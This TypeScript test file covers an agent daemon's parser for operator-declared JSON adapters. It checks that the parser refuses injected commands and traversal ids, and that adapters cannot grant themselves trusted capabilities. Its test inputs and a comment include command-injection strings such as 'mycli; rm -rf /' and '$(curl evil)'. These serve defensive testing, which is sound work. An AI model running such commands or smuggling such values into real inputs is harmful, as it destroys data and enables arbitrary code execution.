import { afterAll, beforeAll, describe, expect, it } from 'vitest'
import { mkdtempSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { loadExternalAdapters, parseExternalAdapter } from './adapters/external.js'

/**
 * Adapters an operator can declare in a JSON file.
 *
 * ⛔ This is a **security boundary**, and the tests are written as refusals rather than as features.
 * The daemon holds the RPC token, spawns agents, and knows where every credential root lives. A file
 * that anything on the machine can write must not be able to talk it into running arbitrary code, or
 * into claiming a capability that would make the scheduler trust it further than it has earned.
 */

let dir: string

beforeAll(() => {
  dir = mkdtempSync(join(tmpdir(), 'agentyard-ext-'))
})

afterAll(() => {
  rmSync(dir, { recursive: true, force: true })
})

const valid = {
  schema_version: 1,
  id: 'my-cli',
  label: 'My CLI',
  command: 'mycli',
  cost_model_id: 'anthropic.subscription.2026-08'
}

const write = (name: string, body: unknown): void => {
  writeFileSync(join(dir, name), JSON.stringify(body))
}

describe('what a declaration may not do', () => {
  it('refuses shell metacharacters in the command', () => {
    // ⛔ The one that matters. `command` is looked up on PATH and executed directly; a value like
    // `mycli; rm -rf ~` or `$(curl evil)` would be arbitrary execution inside the daemon if anything
    // downstream ever passed it to a shell. Refused at the edge so it never can be.
    for (const command of ['mycli; rm -rf /', 'my cli', 'mycli && x', '$(evil)', 'a|b', '`x`']) {
      const result = parseExternalAdapter({ ...valid, command }, 'f.json')
      expect(typeof result, command).toBe('string')
    }
  })

  it('refuses an id that is not a plain slug', () => {
    for (const id of ['../escape', 'Has Caps', 'x', '', 'a/b']) {
      expect(typeof parseExternalAdapter({ ...valid, id }, 'f.json'), id).toBe('string')
    }
  })

  it('refuses a declaration with no cost model', () => {
    const { cost_model_id, ...without } = valid
    void cost_model_id
    expect(typeof parseExternalAdapter(without, 'f.json')).toBe('string')
  })

  it('refuses a schema version it does not understand', () => {
    expect(typeof parseExternalAdapter({ ...valid, schema_version: 2 }, 'f.json')).toBe('string')
    expect(typeof parseExternalAdapter({ ...valid, schema_version: undefined }, 'f.json')).toBe('string')
  })

  it('refuses argv that is not a list of strings', () => {
    expect(typeof parseExternalAdapter({ ...valid, print_args: 'oops' }, 'f.json')).toBe('string')
    expect(typeof parseExternalAdapter({ ...valid, print_args: [1, 2] }, 'f.json')).toBe('string')
  })

  it('accepts a well-formed declaration', () => {
    expect(typeof parseExternalAdapter(valid, 'f.json')).toBe('object')
  })
})

describe('what a declaration cannot grant itself', () => {
  it('cannot claim agentyard MCP tools', () => {
    // ⛔ agentyard's MCP server carries a per-session identity; a declared adapter has no way to pass
    // one. A session that believed it could call `task_complete` and could not would finish and
    // report nothing, which is indistinguishable from a hang.
    write('mcp.json', { ...valid, id: 'wants-mcp', capabilities: { mcp: true } })
    const [loaded] = loadExternalAdapters(dir).adapters.filter((a) => a.info.id === 'wants-mcp')
    expect(loaded?.info.capabilities.mcp).toBe(false)
  })

  it('cannot claim it mints session ids, which is what licenses killing a process', () => {
    // ⛔ Minting an id is how agentyard proves a pid is its own. A file must not be able to grant
    // itself that, or a typo becomes permission to kill a stranger.
    write('mint.json', { ...valid, id: 'wants-mint', capabilities: { mintsSessionId: true } })
    const [loaded] = loadExternalAdapters(dir).adapters.filter((a) => a.info.id === 'wants-mint')
    expect(loaded?.info.capabilities.mintsSessionId).toBe(false)
  })

  it('cannot claim it is metered, or a quota probe it has not got', () => {
    write('meter.json', {
      ...valid,
      id: 'wants-meter',
      capabilities: { metering: 'transcript', quotaProbe: 'cli' }
    })
    const [loaded] = loadExternalAdapters(dir).adapters.filter((a) => a.info.id === 'wants-meter')
    // `none` is what makes everything downstream report cost as **unknown** rather than as zero.
    expect(loaded?.info.capabilities.metering).toBe('none')
    expect(loaded?.info.capabilities.quotaProbe).toBe('none')
  })

  it('is never recorded as measured, whatever it says', () => {
    write('verified.json', { ...valid, id: 'wants-verified' })
    const [loaded] = loadExternalAdapters(dir).adapters.filter((a) => a.info.id === 'wants-verified')
    expect(loaded?.info.verification.level).toBe('documented')
    expect(loaded?.info.verification.note).toContain('verified none of it')
  })
})

describe('conservative defaults', () => {
  it('assumes no compaction, and therefore a handoff wrap-up', () => {
    write('plain.json', { ...valid, id: 'plain' })
    const [loaded] = loadExternalAdapters(dir).adapters.filter((a) => a.info.id === 'plain')
    // ⛔ Claiming a capability that is absent strands a session at a window boundary; omitting one
    // that is present costs a missed optimisation. Every default takes the cheap direction of error.
    expect(loaded?.info.capabilities.manualCompact).toBe(false)
    expect(loaded?.info.policy.wrapUpProtocol).toBe('handoff')
    expect(loaded?.info.capabilities.classifierBackedAuto).toBe(false)
  })

  it('caps accounts at one unless a config-directory variable was declared', () => {
    write('nokey.json', { ...valid, id: 'no-isolation' })
    write('key.json', { ...valid, id: 'has-isolation', isolation_env_var: 'MYCLI_HOME' })
    const all = loadExternalAdapters(dir).adapters
    expect(all.find((a) => a.info.id === 'no-isolation')?.info.capabilities.maxAccounts).toBe(1)
    expect(all.find((a) => a.info.id === 'has-isolation')?.info.capabilities.maxAccounts).toBeNull()
  })
})

describe('a bad file loses its adapter, not the fleet', () => {
  it('reports a malformed file and keeps loading the rest', () => {
    writeFileSync(join(dir, 'broken.json'), '{ not json')
    write('fine.json', { ...valid, id: 'still-fine' })
    const result = loadExternalAdapters(dir)
    expect(result.problems.some((p) => p.includes('broken.json'))).toBe(true)
    expect(result.adapters.some((a) => a.info.id === 'still-fine')).toBe(true)
  })

  it('returns nothing at all when the directory does not exist', () => {
    const result = loadExternalAdapters(join(dir, 'nope'))
    expect(result.adapters).toHaveLength(0)
    expect(result.problems).toHaveLength(0)
  })
})
